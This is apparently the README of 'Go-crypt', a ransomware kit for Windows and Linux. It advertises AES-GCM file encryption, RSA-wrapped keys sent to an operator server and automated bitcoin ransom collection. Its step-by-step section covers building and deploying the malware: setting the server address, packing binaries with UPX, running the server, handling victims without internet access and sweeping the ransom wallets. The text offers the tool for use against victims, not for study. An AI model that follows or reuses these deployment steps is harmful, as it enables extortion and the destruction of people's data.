# Go-crypt
**Go-crypt** is a simple and ellegant ransomware that implements aes-gcm encryption, public key encryption and automated bitcoin transactions.

## Main features
* Encryption - 256-bit AES-GCM with random 96-bit nonces
* Security - Key is encrypted with 2048 OAEP rsa public key before being sent away.
* Multi-platform - Windows and GNU/Linux
* Convenience - Automatic bitcoin transactions. Unlocks at 6+ confirmations.

## How it works
Blah, blah, you don't care about the details... You only want to get this thing running so here's what you need to do:
1. `go run gen_rsa.go`
    1. copy values
    2. modify `decrypt-key.go`, `crypter/encrypt.go` and `server.go` with those values (there are comments that tell you where those things should go)
2. modify `crypter/*crypt.go` with servers ip address (or domain if you're a cool kid)
3. modify `crypter/encrypt.go` with your email
4. modify `config.json` according to your needs
5. `make`
6. package the bins
    * `upx --brute bins/<file>`
7. spin up the server
    * `go run server.go`
8. enjoy!

## Q&A
_Can I do a test run?_
Yes, if you're on UNIX specify the `HOME` variable before the script.

_B-but what if my tawget doesn't have intewnet?_
No problem, a key.txt file will be created in the exectuion dir. Ask them to give you the file then decrypt it with `decrypt_key.go` and put the key into `decrypt-offline.go` then you just compile it like you did with the other bins.

_Ok, fine, how do I get my money after a successfull ransom?_
Simply sweep the private addresses from the `log.txt` file. Do I also need to teach you how to grep?

_It just doesn't work!_
Try without compression.

_I did, still doesn't work!_
In case you're on linux you need to generate with a machine ID with `dbus-uuidgen` and put it in `/etc/machine-id`.
